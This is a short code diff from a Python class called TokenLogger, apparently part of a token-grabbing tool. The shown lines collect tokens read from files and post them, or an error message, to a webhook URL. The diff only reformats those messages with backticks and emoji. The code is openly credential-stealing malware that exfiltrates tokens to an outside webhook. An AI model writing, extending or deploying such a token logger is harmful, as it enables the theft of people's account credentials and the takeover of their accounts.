@@ -80,11 +80,11 @@ class TokenLogger:
                         print(f"Error reading file {file_name}: {e}")
 
             if tokens:
-                send_webhook(self.webhook_url, f"Tokens: {', '.join(tokens)}")
+                send_webhook(self.webhook_url, f"```✅ Tokens: {', '.join(tokens)}```")
             else:
-                send_webhook(self.webhook_url, "No tokens found")
+                send_webhook(self.webhook_url, "```❌ No tokens found```")
         except Exception as e:
-            send_webhook(self.webhook_url, f"Error extracting tokens: {e}")
+            send_webhook(self.webhook_url, f"```❌ Error extracting tokens: {e}```")
 
     def start(self):
         pass
